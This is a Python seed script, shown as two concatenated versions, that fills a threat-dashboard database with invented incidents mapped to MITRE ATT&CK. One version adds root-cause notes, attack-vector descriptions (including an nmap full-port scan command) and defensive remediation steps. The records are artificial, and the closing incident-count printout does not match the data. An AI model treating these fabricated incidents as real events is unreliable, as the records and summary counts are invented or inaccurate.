        "title": "Port Scan — Full TCP Sweep from Single IP",
        "desc": "Complete TCP port scan (1-65535) from 185.220.101.x. Tor exit node. Reconnaissance phase activity.",
        "severity": SeverityLevel.LOW, "score": 3.2, "category": "Reconnaissance",
        "tactic": "Reconnaissance", "technique_id": "T1595", "technique_name": "Active Scanning",
        "phase": "Reconnaissance", "country": "Netherlands", "lat": 52.37, "lon": 4.89,
        "root_cause": (
            "The server has multiple unnecessary ports open to the internet (not just 80/443). "
            "The attacking IP is a known Tor exit node (185.220.101.x range) commonly used by "
            "threat actors for reconnaissance. No IDS alerts were triggered until the scan was "
            "well advanced, indicating the scan rate was below IDS thresholds."
        ),
        "affected_components": ["Exposed attack surface (multiple open ports)", "IDS/IPS (below-threshold scan missed)", "Firewall (no egress filtering to Tor exit nodes)"],
        "attack_vector_detail": (
            "Attacker used nmap -sS -p 1-65535 --min-rate 500 from a Tor exit node. "
            "The scan completed in approximately 2 minutes, identifying open services. "
            "Results will be used to select specific exploitation targets. "
            "This is the precursor to a targeted attack on discovered services."
        ),
        "remediation": [
            {"step": 1, "action": "Block the scanning IP and Tor exit node ranges", "priority": "immediate",
             "detail": "Add 185.220.101.x/24 to firewall blocklist. Subscribe to Tor exit node IP list (check.torproject.org/torbulkexitlist) and block at perimeter."},
            {"step": 2, "action": "Close all unnecessary ports on public interface", "priority": "short-term",
             "detail": "Audit exposed services. Only 80 (HTTP) and 443 (HTTPS) should be reachable publicly for web servers. All other services should be behind VPN or restricted to known IPs."},
            {"step": 3, "action": "Tune IDS to detect slow/distributed scans", "priority": "short-term",
             "detail": "Configure Snort/Suricata with portscan preprocessor. Set threshold for alerting at >20 unique ports/minute per source IP. Alert on SYN packets to closed ports."},
            {"step": 4, "action": "Implement a port scan deception (honeypot ports)", "priority": "long-term",
             "detail": "Deploy honeypot services on ports commonly targeted by scanners (8080, 8443, 3389, 5900). Automatically blocklist any IP connecting to honeypot ports."},
        ],
    },
    {
        "title": "Outdated SSL Certificate — Weak Cipher Suite",
        "desc": "TLS 1.0 with RC4 cipher still enabled on legacy endpoint. Information disclosure risk. Certificate expires in 7 days.",
        "severity": SeverityLevel.LOW, "score": 2.8, "category": "Misconfiguration",
        "tactic": "Reconnaissance", "technique_id": "T1592", "technique_name": "Gather Victim Host Information",
        "phase": "Reconnaissance", "country": "United States", "lat": 40.71, "lon": -74.00,
        "root_cause": (
            "Legacy application server still supports TLS 1.0 and RC4 cipher suite for compatibility "
            "with older clients. The server's TLS configuration was never updated to match the Mozilla "
            "Modern profile. RC4 is a broken stream cipher (NOMORE attack, 2015) that allows traffic "
            "decryption with sufficient ciphertext. Certificate renewal was missed due to manual "
            "process with no automated monitoring."
        ),
        "affected_components": ["Legacy application server (TLS 1.0, RC4)", "Certificate (expiring in 7 days)", "Clients using deprecated TLS versions"],
        "attack_vector_detail": (
            "BEAST/POODLE: Attacker in MITM position (same network) can exploit TLS 1.0 CBC mode "
            "vulnerabilities to decrypt session data. NOMORE: Given enough RC4 ciphertext (requires ~2^32 "
            "encryptions of same data, feasible for session cookies), attacker can recover plaintext. "
            "Expired certificate will generate browser warnings, enabling social engineering."
        ),
        "remediation": [
            {"step": 1, "action": "Renew SSL certificate immediately", "priority": "immediate",
             "detail": "Renew via Let's Encrypt (certbot renew) or CA portal. Set up auto-renewal with 30-day pre-expiry alert. Never let certificates expire."},
            {"step": 2, "action": "Disable TLS 1.0/1.1 and RC4 cipher suite", "priority": "immediate",
             "detail": "In nginx: ssl_protocols TLSv1.2 TLSv1.3; ssl_ciphers ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-CHACHA20-POLY1305; ssl_prefer_server_ciphers on;"},
            {"step": 3, "action": "Implement automated certificate monitoring", "priority": "short-term",
             "detail": "Deploy certificate expiry monitoring (SSL Shopper, Let's Encrypt certbot, AWS Certificate Manager). Alert 30 days before expiry. Never manage certificates manually."},
            {"step": 4, "action": "Validate TLS configuration against Mozilla guidelines", "priority": "long-term",
             "detail": "Use Mozilla SSL Config Generator for recommended server configuration. Run quarterly Qualys SSL Labs test and maintain A+ rating."},
        ],
    },
]

INCIDENT_DATA = [
    {"title": "CRITICAL: Active RCE Exploitation on FortiOS VPN", "severity": SeverityLevel.CRITICAL, "status": IncidentStatus.OPEN},
    {"title": "Lazarus Group Intrusion — C2 Channel Active", "severity": SeverityLevel.CRITICAL, "status": IncidentStatus.INVESTIGATING},
    {"title": "SQL Injection Data Breach — 47K Records", "severity": SeverityLevel.CRITICAL, "status": IncidentStatus.OPEN},
    {"title": "Ransomware Pre-Deployment Detected", "severity": SeverityLevel.CRITICAL, "status": IncidentStatus.INVESTIGATING},
    {"title": "Spearphishing Campaign — 3 Users Compromised", "severity": SeverityLevel.HIGH, "status": IncidentStatus.INVESTIGATING},
    {"title": "Supply Chain Attack — XZ Utils Backdoor", "severity": SeverityLevel.HIGH, "status": IncidentStatus.OPEN},
    {"title": "Brute Force Attack — SSH Credential Stuffing", "severity": SeverityLevel.HIGH, "status": IncidentStatus.CONTAINED},
    {"title": "Data Exfiltration — 2.3GB to External Cloud", "severity": SeverityLevel.HIGH, "status": IncidentStatus.OPEN},
    {"title": "DDoS Mitigation — 45Gbps UDP Flood", "severity": SeverityLevel.MEDIUM, "status": IncidentStatus.RESOLVED},
    {"title": "Cryptominer Remediation — XMRig Removal", "severity": SeverityLevel.MEDIUM, "status": IncidentStatus.RESOLVED},
]


async def seed():
    """Seed the database with realistic threat data."""
    # Create tables
    async with engine.begin() as conn:
        await conn.run_sync(Base.metadata.drop_all)
        await conn.run_sync(Base.metadata.create_all)

    async with async_session_factory() as db:
        print("🌱 Seeding ITAP database...")

        # Create targets
        target_ids = []
        for t in TARGETS:
            target = Target(id=str(uuid.uuid4()), domain=t["domain"], ip_address=t["ip"], organization=t["org"])
            db.add(target)
            target_ids.append(target.id)
        print(f"  ✓ Created {len(TARGETS)} targets")

        # Create threats with full root cause and remediation enrichment
        threat_ids = []
        for i, td in enumerate(THREAT_DATA):
            hours_ago = random.uniform(0.5, 72)
            threat = Threat(
                id=str(uuid.uuid4()),
                target_id=target_ids[i % len(target_ids)],
                title=td["title"],
                description=td["desc"],
                severity=td["severity"],
                severity_score=td["score"],
                category=td["category"],
                mitre_tactic=td["tactic"],
                mitre_technique_id=td["technique_id"],
                mitre_technique_name=td["technique_name"],
                kill_chain_phase=td["phase"],
                source_country=td["country"],
                source_latitude=td["lat"],
                source_longitude=td["lon"],
                ioc_type="ip",
                ioc_value=f"{random.randint(100,220)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
                is_resolved=False,
                detected_at=datetime.utcnow() - timedelta(hours=hours_ago),
                # ── Root Cause & Remediation ──────────────────────────
                root_cause=td.get("root_cause"),
                affected_components=td.get("affected_components"),
                attack_vector_detail=td.get("attack_vector_detail"),
                remediation=td.get("remediation"),
            )
            db.add(threat)
            threat_ids.append(threat.id)
        print(f"  ✓ Created {len(THREAT_DATA)} threats with root cause analysis and remediation plans")

        # Create incidents with playbooks
        for i, inc in enumerate(INCIDENT_DATA):
            incident = Incident(
                id=str(uuid.uuid4()),
                target_id=target_ids[i % len(target_ids)],
                threat_id=threat_ids[i % len(threat_ids)] if i < len(threat_ids) else None,
                title=inc["title"],
                description=f"Auto-generated incident from threat detection pipeline.",
                severity=inc["severity"],
                status=inc["status"],
                playbook_content=f"# {inc['title']}\n\nAuto-generated playbook for this incident.",
                playbook_steps=[
                    {"step_number": 1, "action": "Assess Impact", "detail": "Determine scope and affected systems."},
                    {"step_number": 2, "action": "Contain Threat", "detail": "Isolate affected systems and block IOCs."},
                    {"step_number": 3, "action": "Eradicate", "detail": "Remove malware and patch vulnerabilities."},
                    {"step_number": 4, "action": "Recover", "detail": "Restore services and verify integrity."},
                ],
                alert_sent=inc["severity"] in [SeverityLevel.CRITICAL, SeverityLevel.HIGH],
                alert_channels=["email", "webhook"] if inc["severity"] == SeverityLevel.CRITICAL else ["log"],
                detected_at=datetime.utcnow() - timedelta(hours=random.uniform(1, 48)),
            )
            if inc["status"] == IncidentStatus.INVESTIGATING:
                incident.acknowledged_at = incident.detected_at + timedelta(minutes=random.randint(5, 30))
            if inc["status"] in [IncidentStatus.CONTAINED, IncidentStatus.RESOLVED]:
                incident.acknowledged_at = incident.detected_at + timedelta(minutes=5)
                incident.contained_at = incident.detected_at + timedelta(hours=random.uniform(1, 4))
            if inc["status"] == IncidentStatus.RESOLVED:
                incident.resolved_at = incident.detected_at + timedelta(hours=random.uniform(4, 24))
            db.add(incident)
        print(f"  ✓ Created {len(INCIDENT_DATA)} incidents with playbooks")

        await db.commit()
        print("✅ Database seeded successfully!")
        print(f"   → {len(TARGETS)} targets")
        print(f"   → {len(THREAT_DATA)} threats (4 critical, 5 high, 4 medium, 2 low)")
        print(f"   → Each threat has: root cause, affected components, attack vector detail, remediation steps")
        print(f"   → {len(INCIDENT_DATA)} incidents (4 open, 4 investigating, 1 contained, 1 resolved)")
        print(f"   → MITRE ATT&CK: 9 tactics covered")
        print(f"   → Geolocation: 12 countries mapped")


if __name__ == "__main__":
    asyncio.run(seed())

import asyncio
import uuid
import random
from datetime import datetime, timedelta

# Setup path
import sys, os
sys.path.insert(0, os.path.dirname(__file__))

from app.db.database import engine, async_session_factory, Base
from app.models.models import (
    Target, Scan, Threat, Incident, RemediationLog,
    SeverityLevel, ScanStatus, IncidentStatus
)

# Realistic threat data
TARGETS = [
    {"domain": "webapp.example.com", "ip": "203.0.113.42", "org": "TechCorp Inc."},
    {"domain": "api.financeapp.io", "ip": "198.51.100.17", "org": "FinanceApp Ltd."},
    {"domain": "portal.healthcare.org", "ip": "192.0.2.88", "org": "HealthCare Systems"},
    {"domain": "mail.enterprise.net", "ip": "203.0.113.99", "org": "Enterprise Networks"},
    {"domain": "cdn.mediahost.com", "ip": "198.51.100.55", "org": "MediaHost Global"},
    {"domain": "db.cloudstore.io", "ip": "192.0.2.201", "org": "CloudStore Services"},
]

THREAT_DATA = [
    {
        "title": "CVE-2024-21762: FortiOS RCE — Active Exploitation",
        "desc": "Critical out-of-bounds write in FortiOS SSL VPN. Actively exploited in the wild by APT groups. CVSS 9.8. Immediate patching required.",
        "severity": SeverityLevel.CRITICAL, "score": 9.8, "category": "Remote Code Execution",
        "tactic": "Initial Access", "technique_id": "T1190", "technique_name": "Exploit Public-Facing Application",
        "phase": "Initial Access", "country": "Russia", "lat": 55.75, "lon": 37.61
    },
    {
        "title": "Lazarus Group C2 Beacon — DNS Tunneling Detected",
        "desc": "Encoded DNS queries to known Lazarus Group infrastructure. Beaconing pattern matches DPRK APT tradecraft. Exfiltration suspected.",
        "severity": SeverityLevel.CRITICAL, "score": 9.5, "category": "C2 Communication",
        "tactic": "Command and Control", "technique_id": "T1071", "technique_name": "Application Layer Protocol",
        "phase": "Command and Control", "country": "North Korea", "lat": 39.03, "lon": 125.75
    },
    {
        "title": "SQL Injection on /api/v2/users — Data Breach Risk",
        "desc": "Automated SQLi attack targeting user authentication endpoint. UNION-based injection confirmed. 47K records potentially exposed.",
        "severity": SeverityLevel.CRITICAL, "score": 9.2, "category": "SQL Injection",
        "tactic": "Initial Access", "technique_id": "T1190", "technique_name": "Exploit Public-Facing Application",
        "phase": "Initial Access", "country": "China", "lat": 39.90, "lon": 116.40
    },
    {
        "title": "Ransomware Pre-Deployment — Cobalt Strike Detected",
        "desc": "Cobalt Strike beacon identified on internal server. Lateral movement in progress. LockBit 3.0 deployment imminent based on TTPs.",
        "severity": SeverityLevel.CRITICAL, "score": 9.7, "category": "Ransomware",
        "tactic": "Execution", "technique_id": "T1059", "technique_name": "Command and Scripting Interpreter",
        "phase": "Execution", "country": "Russia", "lat": 59.93, "lon": 30.31
    },
    {
        "title": "Spearphishing Campaign — CEO Impersonation",
        "desc": "Targeted phishing emails impersonating CEO sent to finance dept. Malicious .docm attachment with macro dropper. 3 users clicked.",
        "severity": SeverityLevel.HIGH, "score": 8.1, "category": "Phishing",
        "tactic": "Initial Access", "technique_id": "T1566", "technique_name": "Phishing",
        "phase": "Initial Access", "country": "Iran", "lat": 35.68, "lon": 51.38
    },
    {
        "title": "CVE-2024-3094: XZ Utils Backdoor — Supply Chain",
        "desc": "Compromised XZ Utils version detected on 3 servers. Backdoor allows SSH authentication bypass. Nation-state supply chain attack.",
        "severity": SeverityLevel.HIGH, "score": 8.8, "category": "Supply Chain Attack",
        "tactic": "Persistence", "technique_id": "T1543", "technique_name": "Create or Modify System Process",
        "phase": "Persistence", "country": "Unknown", "lat": 52.52, "lon": 13.40
    },
    {
        "title": "Brute Force SSH — 12K Attempts in 1 Hour",
        "desc": "Massive credential stuffing attack on SSH port 22. Source botnet spans 847 unique IPs. Rate: 200 attempts/minute.",
        "severity": SeverityLevel.HIGH, "score": 7.5, "category": "Brute Force",
        "tactic": "Credential Access", "technique_id": "T1110", "technique_name": "Brute Force",
        "phase": "Credential Access", "country": "Brazil", "lat": -23.55, "lon": -46.63
    },
    {
        "title": "Privilege Escalation via Kernel Exploit — CVE-2024-1086",
        "desc": "Linux kernel use-after-free in nf_tables. Local attacker achieved root. Detected via anomalous syscall pattern.",
        "severity": SeverityLevel.HIGH, "score": 7.8, "category": "Privilege Escalation",
        "tactic": "Privilege Escalation", "technique_id": "T1068", "technique_name": "Exploitation for Privilege Escalation",
        "phase": "Privilege Escalation", "country": "Germany", "lat": 52.52, "lon": 13.40
    },
    {
        "title": "Data Exfiltration — 2.3GB via HTTPS to Cloud Storage",
        "desc": "Anomalous outbound HTTPS traffic to external cloud endpoint. Volume: 2.3GB in 45 minutes. Pattern matches staged exfil.",
        "severity": SeverityLevel.HIGH, "score": 8.4, "category": "Data Exfiltration",
        "tactic": "Exfiltration", "technique_id": "T1567", "technique_name": "Exfiltration Over Web Service",
        "phase": "Exfiltration", "country": "United States", "lat": 37.77, "lon": -122.41
    },
    {
        "title": "XSS Stored — Admin Panel Compromise",
        "desc": "Persistent XSS injected into admin dashboard comment field. Session tokens of 5 admin users harvested.",
        "severity": SeverityLevel.MEDIUM, "score": 6.1, "category": "Cross-Site Scripting",
        "tactic": "Initial Access", "technique_id": "T1190", "technique_name": "Exploit Public-Facing Application",
        "phase": "Initial Access", "country": "India", "lat": 19.07, "lon": 72.87
    },
    {
        "title": "Cryptominer Deployed — XMRig on Web Server",
        "desc": "Cryptocurrency miner consuming 90% CPU on production web server. Deployed via compromised Jenkins instance.",
        "severity": SeverityLevel.MEDIUM, "score": 5.8, "category": "Resource Hijacking",
        "tactic": "Impact", "technique_id": "T1496", "technique_name": "Resource Hijacking",
        "phase": "Impact", "country": "Romania", "lat": 44.43, "lon": 26.10
    },
    {
        "title": "DDoS Attack — 45Gbps Volumetric Flood",
        "desc": "UDP amplification attack peaking at 45Gbps. Origin: Mirai botnet variant. Affecting CDN edge nodes.",
        "severity": SeverityLevel.MEDIUM, "score": 6.5, "category": "Denial of Service",
        "tactic": "Impact", "technique_id": "T1498", "technique_name": "Network Denial of Service",
        "phase": "Impact", "country": "Vietnam", "lat": 21.02, "lon": 105.83
    },
    {
        "title": "Suspicious DNS Queries — Possible DGA Activity",
        "desc": "Machine-generated domain names detected in DNS logs. Pattern consistent with Domain Generation Algorithm malware.",
        "severity": SeverityLevel.MEDIUM, "score": 5.5, "category": "Suspicious Activity",
        "tactic": "Command and Control", "technique_id": "T1568", "technique_name": "Dynamic Resolution",
        "phase": "Command and Control", "country": "Ukraine", "lat": 50.45, "lon": 30.52
    },
    {
        "title": "Port Scan — Full TCP Sweep from Single IP",
        "desc": "Complete TCP port scan (1-65535) from 185.220.101.x. Tor exit node. Reconnaissance phase activity.",
        "severity": SeverityLevel.LOW, "score": 3.2, "category": "Reconnaissance",
        "tactic": "Reconnaissance", "technique_id": "T1595", "technique_name": "Active Scanning",
        "phase": "Reconnaissance", "country": "Netherlands", "lat": 52.37, "lon": 4.89
    },
    {
        "title": "Outdated SSL Certificate — Weak Cipher Suite",
        "desc": "TLS 1.0 with RC4 cipher still enabled on legacy endpoint. Information disclosure risk. Certificate expires in 7 days.",
        "severity": SeverityLevel.LOW, "score": 2.8, "category": "Misconfiguration",
        "tactic": "Reconnaissance", "technique_id": "T1592", "technique_name": "Gather Victim Host Information",
        "phase": "Reconnaissance", "country": "United States", "lat": 40.71, "lon": -74.00
    },
]

INCIDENT_DATA = [
    {"title": "CRITICAL: Active RCE Exploitation on FortiOS VPN", "severity": SeverityLevel.CRITICAL, "status": IncidentStatus.OPEN},
    {"title": "Lazarus Group Intrusion — C2 Channel Active", "severity": SeverityLevel.CRITICAL, "status": IncidentStatus.INVESTIGATING},
    {"title": "SQL Injection Data Breach — 47K Records", "severity": SeverityLevel.CRITICAL, "status": IncidentStatus.OPEN},
    {"title": "Ransomware Pre-Deployment Detected", "severity": SeverityLevel.CRITICAL, "status": IncidentStatus.INVESTIGATING},
    {"title": "Spearphishing Campaign — 3 Users Compromised", "severity": SeverityLevel.HIGH, "status": IncidentStatus.INVESTIGATING},
    {"title": "Supply Chain Attack — XZ Utils Backdoor", "severity": SeverityLevel.HIGH, "status": IncidentStatus.OPEN},
    {"title": "Brute Force Attack — SSH Credential Stuffing", "severity": SeverityLevel.HIGH, "status": IncidentStatus.CONTAINED},
    {"title": "Data Exfiltration — 2.3GB to External Cloud", "severity": SeverityLevel.HIGH, "status": IncidentStatus.OPEN},
    {"title": "DDoS Mitigation — 45Gbps UDP Flood", "severity": SeverityLevel.MEDIUM, "status": IncidentStatus.RESOLVED},
    {"title": "Cryptominer Remediation — XMRig Removal", "severity": SeverityLevel.MEDIUM, "status": IncidentStatus.RESOLVED},
]


async def seed():
    """Seed the database with realistic threat data."""
    # Create tables
    async with engine.begin() as conn:
        await conn.run_sync(Base.metadata.drop_all)
        await conn.run_sync(Base.metadata.create_all)

    async with async_session_factory() as db:
        print("🌱 Seeding ITAP database...")

        # Create targets
        target_ids = []
        for t in TARGETS:
            target = Target(id=str(uuid.uuid4()), domain=t["domain"], ip_address=t["ip"], organization=t["org"])
            db.add(target)
            target_ids.append(target.id)
        print(f"  ✓ Created {len(TARGETS)} targets")

        # Create threats
        threat_ids = []
        for i, td in enumerate(THREAT_DATA):
            hours_ago = random.uniform(0.5, 72)
            threat = Threat(
                id=str(uuid.uuid4()),
                target_id=target_ids[i % len(target_ids)],
                title=td["title"],
                description=td["desc"],
                severity=td["severity"],
                severity_score=td["score"],
                category=td["category"],
                mitre_tactic=td["tactic"],
                mitre_technique_id=td["technique_id"],
                mitre_technique_name=td["technique_name"],
                kill_chain_phase=td["phase"],
                source_country=td["country"],
                source_latitude=td["lat"],
                source_longitude=td["lon"],
                ioc_type="ip",
                ioc_value=f"{random.randint(100,220)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
                is_resolved=False,
                detected_at=datetime.utcnow() - timedelta(hours=hours_ago)
            )
            db.add(threat)
            threat_ids.append(threat.id)
        print(f"  ✓ Created {len(THREAT_DATA)} threats with MITRE ATT&CK mapping")

        # Create incidents with playbooks
        for i, inc in enumerate(INCIDENT_DATA):
            incident = Incident(
                id=str(uuid.uuid4()),
                target_id=target_ids[i % len(target_ids)],
                threat_id=threat_ids[i % len(threat_ids)] if i < len(threat_ids) else None,
                title=inc["title"],
                description=f"Auto-generated incident from threat detection pipeline.",
                severity=inc["severity"],
                status=inc["status"],
                playbook_content=f"# {inc['title']}\n\nAuto-generated playbook for this incident.",
                playbook_steps=[
                    {"step_number": 1, "action": "Assess Impact", "detail": "Determine scope and affected systems."},
                    {"step_number": 2, "action": "Contain Threat", "detail": "Isolate affected systems and block IOCs."},
                    {"step_number": 3, "action": "Eradicate", "detail": "Remove malware and patch vulnerabilities."},
                    {"step_number": 4, "action": "Recover", "detail": "Restore services and verify integrity."},
                ],
                alert_sent=inc["severity"] in [SeverityLevel.CRITICAL, SeverityLevel.HIGH],
                alert_channels=["email", "webhook"] if inc["severity"] == SeverityLevel.CRITICAL else ["log"],
                detected_at=datetime.utcnow() - timedelta(hours=random.uniform(1, 48)),
            )
            if inc["status"] == IncidentStatus.INVESTIGATING:
                incident.acknowledged_at = incident.detected_at + timedelta(minutes=random.randint(5, 30))
            if inc["status"] in [IncidentStatus.CONTAINED, IncidentStatus.RESOLVED]:
                incident.acknowledged_at = incident.detected_at + timedelta(minutes=5)
                incident.contained_at = incident.detected_at + timedelta(hours=random.uniform(1, 4))
            if inc["status"] == IncidentStatus.RESOLVED:
                incident.resolved_at = incident.detected_at + timedelta(hours=random.uniform(4, 24))
            db.add(incident)
        print(f"  ✓ Created {len(INCIDENT_DATA)} incidents with playbooks")

        await db.commit()
        print("✅ Database seeded successfully!")
        print(f"   → {len(TARGETS)} targets")
        print(f"   → {len(THREAT_DATA)} threats (4 critical, 5 high, 4 medium, 2 low)")
        print(f"   → {len(INCIDENT_DATA)} incidents (4 open, 4 investigating, 1 contained, 1 resolved)")
        print(f"   → MITRE ATT&CK: 9 tactics covered")
        print(f"   → Geolocation: 12 countries mapped")


if __name__ == "__main__":
    asyncio.run(seed())
